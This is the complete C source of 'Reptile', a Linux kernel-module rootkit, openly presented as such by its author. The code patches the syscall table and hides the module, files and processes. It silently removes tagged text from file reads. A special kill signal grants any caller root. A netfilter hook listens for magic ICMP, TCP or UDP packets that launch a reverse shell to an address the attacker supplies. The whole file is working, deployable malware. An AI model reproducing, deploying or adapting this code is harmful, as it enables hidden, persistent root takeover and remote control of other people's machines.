/* REPTILE ROOTKIT
 *
 * A LKM Linux rootkit
 * Author: F0rb1dd3n
 *
 */

#include <linux/module.h> 
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/file.h>
#include <linux/workqueue.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/string.h>
#include "sbin/config.h"

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
	#include <linux/proc_ns.h>
#else
	#include <linux/proc_fs.h>
#endif
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
	#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
    	#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
#else
    	#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
#endif

#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
#define SIGROOT		48
#define SIGHIDEPROC 	49
#define SIGHIDEREPTILE 	50
#define SIGHIDECONTENT  51
#define SSIZE_MAX 	32767
#define SYS_CALL_TABLE \
({ \
unsigned int *p = (unsigned int*)__builtin_alloca(16); \
 p[0] = 0x5f737973; \
 p[1] = 0x6c6c6163; \
 p[2] = 0x6261745f; \
 p[3] = 0x0000656c; \
 (char *)p; \
})

#define SYS_CLOSE \
({ \
unsigned int *p = (unsigned int*)__builtin_alloca(12); \
 p[0] = 0x5f737973; \
 p[1] = 0x736f6c63; \
 p[2] = 0x00000065; \
 (char *)p; \
})

int hidden = 0, hide_file_content = 1;
struct workqueue_struct *work_queue;
static struct nf_hook_ops magic_packet_hook_options;
static struct list_head *mod_list;
static unsigned long *sct;
atomic_t read_on;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
	#define VFS_READ \
	({ \
	unsigned int *p = (unsigned int*)__builtin_alloca(9); \
	 p[0] = 0x5f736676; \
	 p[1] = 0x64616572; \
	 p[2] = 0x00; \
	 (char *)p; \
	})

    	asmlinkage ssize_t (*vfs_read_addr)(struct file *file, char __user *buf, size_t count, loff_t *pos);
#endif

asmlinkage int (*o_kill)(pid_t pid, int sig);
asmlinkage int (*o_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage int (*o_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage ssize_t (*o_read)(unsigned int fd, char __user *buf, size_t count);

asmlinkage int l33t_kill(pid_t pid, int sig);
asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count);

struct shell_task {
    	struct work_struct work;
    	char *path;
    	char *ip;
    	char *port;
};

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

void hide(void) {
	if(hidden) return;

	while(!mutex_trylock(&module_mutex)) cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
        THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
	hidden = 1;
}

void show(void) {
	if(!hidden) return;

	while(!mutex_trylock(&module_mutex)) cpu_relax();
	list_add(&THIS_MODULE->list, mod_list);
	mutex_unlock(&module_mutex);
	hidden = 0;
}

struct task_struct *find_task(pid_t pid){
	struct task_struct *p = current;
	struct task_struct *ret = NULL;	

	rcu_read_lock();
	for_each_process(p) {
		if (p->pid == pid) {
			get_task_struct(p);
			ret = p;
		}
	}
	rcu_read_unlock();	

	return ret;
}

int is_invisible(pid_t pid){
	struct task_struct *task;
	int ret = 0;

	if (!pid) return ret;
	task = find_task(pid);
	if (!task) return ret;
	if (task->flags & 0x10000000) ret = 1;
	put_task_struct(task);
	return ret;
}

void exec(char **argv){
	static char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

void shell_execer(struct work_struct *work) {
    	struct shell_task *task = (struct shell_task *)work;
    	char *argv[] = { task->path, "-t", task->ip, "-p", task->port, NULL };

    	exec(argv);
	kfree(task->path);
	kfree(task->ip);
	kfree(task->port);
	kfree(task);
}

int shell_exec_queue(char *path, char *ip, char *port) {
    	struct shell_task *task;

    	task = kmalloc(sizeof(*task), GFP_KERNEL);
    
    	if(!task) return -1;

    	REPTILE_INIT_WORK(&task->work, &shell_execer);
    	task->path = kstrdup(path, GFP_KERNEL);
	if(!task->path) {
		kfree(task);
		return -1;
	}

	task->ip = kstrdup(ip, GFP_KERNEL);
	if(!task->ip) {
		kfree(task->path);
		kfree(task);
		return -1;
    	}

	task->port = kstrdup(port, GFP_KERNEL);
	if(!task->port) { 
		kfree(task->path);
		kfree(task->ip);
		kfree(task);
		return -1;
	}

    	return queue_work(work_queue, &task->work);
}

struct file *e_fget_light(unsigned int fd, int *fput_needed) {
    	struct file *file;
    	struct files_struct *files = current->files;

    	*fput_needed = 0;
    	if (likely((atomic_read(&files->count) == 1))) {
        	file = fcheck(fd);
    	} else {
        	spin_lock(&files->file_lock);
        	file = fcheck(fd);
        	if (file) {
           		get_file(file);
            		*fput_needed = 1;
        	}
        	spin_unlock(&files->file_lock);
    	}
    	return file;
}

int f_check(void *arg, ssize_t size) {
	char *buf;

	if ((size <= 0) || (size >= SSIZE_MAX)) return(-1);

	buf = (char *) kmalloc(size+1, GFP_KERNEL);
	if(!buf) return(-1);

	if(copy_from_user((void *) buf, (void *) arg, size)) goto out;

	buf[size] = 0;

	if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL)) {
		kfree(buf);
		return(1);
	}
out:
	kfree(buf);
	return(-1);
}

int hide_content(void *arg, ssize_t size) {
	char *buf, *p1, *p2;
	int i, newret;

	buf = (char *) kmalloc(size, GFP_KERNEL);
	if(!buf) return(-1);

	if(copy_from_user((void *) buf, (void *) arg, size)) {
		kfree(buf);
		return size;
	}

	p1 = strstr(buf, HIDETAGIN);
	p2 = strstr(buf, HIDETAGOUT);
	p2 += strlen(HIDETAGOUT);

	if(p1 >= p2 || !p1 || !p2) {
		kfree(buf);
		return size;
	}

	i = size - (p2 - buf);
	memmove((void *) p1, (void *) p2, i);
	newret = size - (p2 - p1);

	if(copy_to_user((void *) arg, (void *) buf, newret)) {
		kfree(buf);
		return size;
	}

	kfree(buf);
	return newret;
}

void s_xor(char *arg, int key, int nbytes) {
        int i;
        for(i = 0; i < nbytes; i++) arg[i] ^= key;
}

int atoi(char *str){
	int i, result = 0;
	for(i = 0; str[i] != '\0'; i++) result = result*10 + str[i] - '\0';

	return result;
}

void decode_n_spawn(const char *data) {
	int tsize;
	char *ip, *port, *p = NULL, *buf = NULL, *tok = NULL, *token = TOKEN; 

    	tsize = strlen(token);
	p = (char *) kmalloc(tsize+24, GFP_KERNEL);
	if(!p) return;

	buf = p; // save the base pointer to free it right

        bzero(buf, tsize+24);
        memcpy(buf, data, tsize+24);
        s_xor(buf, 11, strlen(buf));
	tok = buf;
	strsep(&buf, " ");
	ip = buf;
	strsep(&buf, " ");
	port = buf;
	strsep(&buf, " ");

	if(!tok || !ip || !port) goto out;

	if(strcmp(token, tok) == 0 && atoi(port) > 0 && atoi(port) <= 65535 && strlen(ip) >= 7 && strlen(ip) <= 15) shell_exec_queue(SHELL, ip, port);

out:
	kfree(p);
}

unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer, 
			       const struct net_device *in, const struct net_device *out, 
			       int (*okfn)(struct sk_buff *)) {
    	
	const struct iphdr   *ip_header;
    	const struct icmphdr *icmp_header;
    	const struct tcphdr  *tcp_header;
    	const struct udphdr  *udp_header;
	struct iphdr	_iph;
    	struct icmphdr	_icmph;
	struct tcphdr	_tcph;
	struct udphdr	_udph;
	const char *data;
	char *token = TOKEN;
    	int tsize = strlen(token);
	char _dt[tsize+11];

    	s_xor(token, 11, tsize);

    	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);

    	if (!ip_header) return NF_ACCEPT;

     	if (ip_header->protocol == IPPROTO_ICMP) {
        	icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_icmph), &_icmph);

        	if (!icmp_header) return NF_ACCEPT;

        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct icmphdr), sizeof(_dt), &_dt);

    		if (!data) return NF_ACCEPT;

    		if ((icmp_header->code == ICMP_ECHO) && (memcmp(data, token, tsize) == 0)){
    			decode_n_spawn(data);
			return NF_DROP;
    		}
    	}
     
     	if (ip_header->protocol == IPPROTO_TCP) {
        	tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_tcph), &_tcph);

        	if (!tcp_header) return NF_ACCEPT;

        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct tcphdr), sizeof(_dt), &_dt);
    		
		if (!data) return NF_ACCEPT;

		if(htons(tcp_header->source) == SRCPORT && htons(tcp_header->dest) == TCPPORT && memcmp(data, token, tsize) == 0){
			decode_n_spawn(data);
			return NF_DROP;
		}
    	}
     
     	if (ip_header->protocol == IPPROTO_UDP) {
        	udp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_udph), &_udph);

        	if (!udp_header) return NF_ACCEPT;

        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct udphdr), sizeof(_dt), &_dt);
    		
		if (!data) return NF_ACCEPT;

		if(htons(udp_header->source) == SRCPORT && htons(udp_header->dest) == UDPPORT && memcmp(data, token, tsize) == 0){
			decode_n_spawn(data);
			return NF_DROP;
		}
    	}
    	return NF_ACCEPT;
}

void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
    	char *p;

    	for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
        	if(memcmp(p, needle, needle_size) == 0) return (void *)p;
    	}
    	return NULL;
}

#ifdef __x86_64__

unsigned long *find_sys_call_table(void) {
	unsigned long sct_off = 0;
    	unsigned char code[512];
    	char **p;

    	rdmsrl(MSR_LSTAR, sct_off);
    	memcpy(code, (void *)sct_off, sizeof(code));

    	p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
  
    	if(p) {
        	unsigned long *table = *(unsigned long **)((char *)p + 3);
        	table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
        	return table;
    	}
    	return NULL;
}

#else

struct {
	unsigned short limit;
	unsigned long base;
} __attribute__ ((packed))idtr;

struct {
	unsigned short off1;
	unsigned short sel;
    	unsigned char none, flags;
    	unsigned short off2;
} __attribute__ ((packed))idt;

unsigned long *find_sys_call_table(void) {
    	char **p;
    	unsigned long sct_off = 0;
    	unsigned char code[255];

    	asm("sidt %0":"=m" (idtr));
    	memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
    	sct_off = (idt.off2 << 16) | idt.off1;
    	memcpy(code, (void *)sct_off, sizeof(code));

    	p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

    	if(p) return *(unsigned long **)((char *)p + 3);
    	else return NULL;
}

#endif

unsigned long *generic_find_sys_call_table(void){
	unsigned long *syscall_table;
	unsigned long _sys_close;
	unsigned long int i;

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
	_sys_close = (unsigned long) kallsyms_lookup_name(SYS_CLOSE);
#endif

	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
		if (syscall_table[__NR_close] == (unsigned long)sys_close)
#else 
		if (syscall_table[__NR_close] == (unsigned long)_sys_close)
#endif
			return syscall_table;
	}
	return NULL;
}

asmlinkage int l33t_kill(pid_t pid, int sig){

	struct task_struct *task;

	switch(sig) {
		case SIGHIDEREPTILE:
			if(hidden) show();
			else hide();
			break;
		case SIGHIDEPROC:
			if((task = find_task(pid)) == NULL) return -ESRCH;

			task->flags ^= 0x10000000;
			put_task_struct(task);
			break;
		case SIGHIDECONTENT:
			if(hide_file_content) hide_file_content = 0;
			else hide_file_content = 1;
			break;
		case SIGROOT:
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
                	current->uid   = 0;
                	current->suid  = 0;
                	current->euid  = 0;
                	current->gid   = 0;
                	current->egid  = 0;
                	current->fsuid = 0;
                	current->fsgid = 0;
                	cap_set_full(current->cap_effective);
                	cap_set_full(current->cap_inheritable);
                	cap_set_full(current->cap_permitted);
#else
                	commit_creds(prepare_kernel_cred(0));
#endif
			break;
		default:
			return o_kill(pid, sig);
	}
	return 0;
}

asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
	int ret = o_getdents64(fd, dirent, count); 
	unsigned short p = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdir, *prev = NULL;
	struct inode *d_inode;
	char *hide = HIDE;

	if (ret <= 0) return ret;

	kdir = kzalloc(ret, GFP_KERNEL);
	if (kdir == NULL) return ret;

	if(copy_from_user(kdir, dirent, ret)) goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		p = 1;

	while(off < ret) {
		dir = (void *)kdir + off;
		if((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if(dir == kdir) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else {
			prev = dir;
		}
		off += dir->d_reclen;
	}
	if(copy_to_user(dirent, kdir, ret)) goto end;

end:
	kfree(kdir);
	return ret;
}

asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
	int ret = o_getdents(fd, dirent, count);
	unsigned short p = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdir, *prev = NULL;
	struct inode *d_inode;
	char *hide = HIDE;	

	if (ret <= 0) return ret;	

	kdir = kzalloc(ret, GFP_KERNEL);
	if(kdir == NULL) return ret;

	if(copy_from_user(kdir, dirent, ret)) goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if(d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)) p = 1;

	while(off < ret) {
		dir = (void *)kdir + off;
		if((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if(dir == kdir) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else {
			prev = dir;
		}
		off += dir->d_reclen;
	}
	if(copy_to_user(dirent, kdir, ret)) goto end;

end:	
	kfree(kdir);
	return ret;
}

asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count) {
	struct file *f;
	int fput_needed;
	ssize_t ret;
       
	if(hide_file_content) {
		ret = -EBADF;

		atomic_set(&read_on, 1);
		f = e_fget_light(fd, &fput_needed);

		if (f) {
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
			ret = vfs_read(f, buf, count, &f->f_pos);
#else
			ret = vfs_read_addr(f, buf, count, &f->f_pos);
#endif			
			if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
	    	
			fput_light(f, fput_needed);
		}
		atomic_set(&read_on, 0);
	} else {
		ret = o_read(fd, buf, count);
	}

	return ret;
}

static int __init reptile_init(void) { 
	char *argv[] = { START, NULL, NULL };
	
	atomic_set(&read_on, 0);
	sct = (unsigned long *)find_sys_call_table();
	if(!sct) sct = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
	if(!sct) sct = (unsigned long *)generic_find_sys_call_table();			
	if(!sct) return -1;
	
    	o_kill = (void *)sct[__NR_kill];
    	o_getdents64 = (void *)sct[__NR_getdents64];
    	o_getdents = (void *)sct[__NR_getdents];
    	o_read = (void *)sct[__NR_read];
		
	write_cr0(read_cr0() & (~0x10000));
	sct[__NR_kill] = (unsigned long)l33t_kill;		
	sct[__NR_getdents64] = (unsigned long)l33t_getdents64;		
	sct[__NR_getdents] = (unsigned long)l33t_getdents;		
	write_cr0(read_cr0() | 0x10000);

    	magic_packet_hook_options.hook     = (void *) magic_packet_hook;
    	magic_packet_hook_options.hooknum  = 0;
    	magic_packet_hook_options.pf       = PF_INET;
    	magic_packet_hook_options.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
    	nf_register_net_hook(&init_net, &magic_packet_hook_options);
#else
    	nf_register_hook(&magic_packet_hook_options);
#endif
    	work_queue = create_workqueue(HIDE);	
	
	exec(argv);

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
    	vfs_read_addr = (void *)kallsyms_lookup_name(VFS_READ);
#endif

	write_cr0(read_cr0() & (~0x10000));
	sct[__NR_read] = (unsigned long)l33t_read;		
	write_cr0(read_cr0() | 0x10000);

	return 0; 
} 

static void __exit reptile_exit(void) { 
	if(o_kill){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_kill] = (unsigned long)o_kill;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_getdents64){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_getdents64] = (unsigned long)o_getdents64;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_getdents){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_getdents] = (unsigned long)o_getdents;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_read) {
		while(atomic_read(&read_on) != 0) schedule();
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_read] = (unsigned long)o_read;
		write_cr0(read_cr0() | 0x10000);
	}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_unregister_net_hook(&init_net, &magic_packet_hook_options);
#else
    	nf_unregister_hook(&magic_packet_hook_options);
#endif
    	flush_workqueue(work_queue);
    	destroy_workqueue(work_queue);
}

module_init(reptile_init);
module_exit(reptile_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("F0rb1dd3n - f0rb1dd3n@tuta.io");
MODULE_DESCRIPTION("Reptile - A linux LKM rootkit");
